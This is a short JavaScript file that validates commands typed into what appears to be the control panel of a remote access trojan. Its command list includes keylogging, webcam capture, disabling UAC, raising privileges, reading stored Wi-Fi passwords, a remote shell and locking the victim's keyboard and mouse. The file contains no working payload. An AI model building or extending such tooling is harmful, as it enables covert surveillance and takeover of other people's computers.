// commands.js

// Define the valid commands directly in JavaScript
const validCommands = {
    'help': [],
    'start': ['<input>'],
    'stop': [],
    'status': [],
    'restart': ['<input>'],
    'connect': ['<input>'],
    'list': [],
    'tasklist': [],
    'screenshare': [],
    'shell': [],
    'drivers': [],
    'setvalue': [],
    'delkey': [],
    'createkey': [],
    'disableUAC': [],
    'reboot': [],
    'usbdrivers': [],
    'volumeup': [],
    'volumedown': [],
    'monitors': [],
    'kill': ['<input>'],
    'extendrights': [],
    'geolocate': [],
    'turnoffmon': [],
    'turnonmon': [],
    'setwallpaper': [],
    'keyscan_start': [],
    'send_logs': [],
    'stop_keylogger': [],
    'delfile': ['<input>'],
    'createfile': ['<input>'],
    'writein': ['<input>'],
    'sendmessage': [],
    'profilepswd': [],
    'profiles': [],
    'cpu_cores': [],
    'cd': ['<input>'],
    'cd ..': [],
    'dir': [],
    'portscan': [],
    'systeminfo': [],
    'localtime': [],
    'abspath': ['<input>'],
    'readfile': ['<input>'],
    'disable--keyboard': [],
    'disable--mouse': [],
    'disable--all': [],
    'enable--all': [],
    'enable--keyboard': [],
    'enable--mouse': [],
    'browser': ['<input>'],
    'cp': ['<input>'],
    'mv': ['<input>'],
    'editfile': ['<input>'],
    'mkdir': ['<input>'],
    'rmdir': ['<input>'],
    'searchfile': ['<input>'],
    'curpid': [],
    'sysinfo': [],
    'pwd': [],
    'screenshot': [],
    'webcam_snap': [],
    'startfile': ['<input>'],
    'download': ['<input>'],
    'upload': []
};

export const validateCommand = (command) => {
    const [baseCommand, ...args] = command.split(' ');
    if (!validCommands.hasOwnProperty(baseCommand)) {
        alert(`Invalid command: ${baseCommand}`);
        return false;
    }
    if (validCommands[baseCommand].includes('<input>') && args.length === 0) {
        alert(`Command ${baseCommand} requires additional input`);
        return false;
    }
    return true;
};

export const getValidCommands = () => {
    return validCommands;
};
